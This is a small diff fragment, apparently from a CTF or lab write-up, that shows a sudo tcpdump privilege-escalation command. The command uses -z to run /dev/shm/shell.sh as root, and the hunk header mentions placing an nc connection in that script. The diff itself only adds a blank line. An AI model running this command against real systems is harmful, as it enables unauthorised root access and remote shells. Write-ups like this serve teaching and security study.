@@ -217,6 +217,7 @@ so we need a script for this `-z` command to run so we will just echo a `nc` con
 next, move to the `sudo tcpdump`
 
     sudo tcpdump -ln -w /dev/null -W 1 -G 1 -z /dev/shm/shell.sh -Z root 
+
 ![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552674054625_image.png)
 
 
